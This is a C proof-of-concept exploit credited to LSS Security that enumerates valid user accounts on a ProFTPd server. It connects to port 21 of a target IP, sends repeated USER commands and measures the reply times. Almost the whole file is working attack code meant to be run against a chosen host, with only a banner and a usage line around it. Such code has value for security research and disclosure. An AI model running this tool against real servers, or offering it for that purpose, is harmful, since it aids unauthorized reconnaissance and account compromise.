// ProFTPd remote users discovery based on code execution time - POC exploit
// Coded by Leon Juranic // http://www.lss.hr

#include <sys/socket.h>
#include <sys/types.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <sys/time.h>

#define PORT 21
#define PROBE 8

main (int argc, char **argv)
{
  int sock,n,y;
  long dist,stat=0;
  struct sockaddr_in sin;
  char buf[1024], buf2[1024];
  struct timeval tv, tv2;
  struct timezone tz, tz2;

  printf ("Proftpd remote users discovery exploit\n"
          " Coded by Leon / LSS Security\n"
          ">-------------------------------------<\n");

  if (argc != 3) { printf ("usage: %s ",argv[0]); exit(0); }
 
  sock = socket (AF_INET, SOCK_STREAM, 0);
  sin.sin_family = AF_INET;
  sin.sin_port = htons (PORT);
  sin.sin_addr.s_addr = inet_addr (argv[1]);
  bzero (sin.sin_zero,8);

  connect (sock, (struct sockaddr*)&sin, sizeof(struct sockaddr));

  printf ("Login time: ");
  n = read (sock,buf2, sizeof(buf2));
  for (y=0;y<PROBE;y++) {
     gettimeofday (&tv,&tz);
     snprintf (buf, sizeof(buf)-1,"USER %s\r\n",argv[2]);
     write (sock, buf, strlen(buf));
     n = read (sock,buf2, sizeof(buf2));
     gettimeofday (&tv2,&tz2);
     dist =tv2.tv_usec - tv.tv_usec;
     stat += dist;
     printf (" %d |",dist);
  }
  printf ("\nAvrg: %d\n",(stat/PROBE));
  close (sock);
}
